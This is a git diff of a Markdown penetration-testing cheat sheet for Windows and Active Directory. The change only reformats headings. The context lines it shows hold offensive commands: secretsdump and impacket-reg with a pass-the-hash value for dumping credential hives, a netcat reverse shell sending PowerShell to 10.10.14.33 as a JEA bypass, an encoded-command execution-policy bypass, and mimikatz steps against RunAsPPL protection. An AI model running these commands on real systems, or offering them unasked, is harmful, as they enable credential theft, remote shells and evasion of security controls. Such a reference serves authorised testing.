@@ -143,14 +143,14 @@ Add-PswaAuthorizationRule -UsernName * -ComputerName * -ConfigurationName *
 
 **HKEY_LOCAL_MACHINE** called HKLM includes three keys SAM, SYSTEM, and SECURITY.
 
-dump SYSTEM and SECURITY directly from HKLM :
+> dump SYSTEM and SECURITY directly from HKLM :
 
 ```bash
 secretsdump.py local -system SYSTEM -security SECURITY -ntds ntds.dit -outputfile hashes
 ```
 
 
-dump HKU registry remotely with hashes argument :
+> dump HKU registry remotely with hashes argument :
 ```bash
 impacket-reg -hashes :34ed87d42adaa3ca4f5db34a876cb3ab domain.local/john.doe@job query -keyName HKU\\Software
 
@@ -300,7 +300,7 @@ static void Main(string[] args){
 
 ### Just Enough Administration
 
-show current languages level :
+> show current languages level :
 ```powershell
 # METHOD 1
 (Get-PSSessionConfiguration -Name Test).LanguageMode
@@ -308,7 +308,7 @@ show current languages level :
 $ExecutionContext.SessionState.LanguageMode # use property
 ```
 
-Bypass JEA in ConstrainedLanguage :
+> Bypass JEA in ConstrainedLanguage :
 ```powershell
 { C:\Windows\System32\spool\drivers\color\nc.exe -e powershell.exe 10.10.14.33 9003 }
 ```
@@ -319,7 +319,7 @@ Bypass JEA in ConstrainedLanguage :
 powershell -ExecutionPolicy Bypass -File C:\script.ps1
 ```
 
-bypass EP using encoding :
+> bypass EP using encoding :
 
 ```powershell
 $command = "Write-Host 'hello world'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command);$encoded = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encoded
@@ -329,7 +329,7 @@ $command = "Write-Host 'hello world'"; $bytes = [System.Text.Encoding]::Unicode.
 
 [ ❓ ] : [RunAsPPL](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) is an **additional LSA protection** to prevent reading memory and code injection by **non-protected processes**.
 
-bypass RunAsPPL with mimikatz :
+> bypass RunAsPPL with mimikatz :
 ```
 mimikatz # privilege::debug
 mimikatz # !+
